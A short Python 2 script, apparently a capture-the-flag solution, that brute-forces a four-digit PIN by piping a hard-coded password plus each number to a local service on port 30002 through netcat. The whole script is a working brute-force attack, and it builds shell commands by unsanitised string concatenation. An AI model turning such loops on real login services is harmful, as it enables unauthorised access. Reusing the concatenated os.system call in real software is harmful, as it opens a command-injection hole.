import os

for i in range(10000):
	password = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ '+str(i)
	print password
	os.system("echo "+password+" | nc localhost 30002")	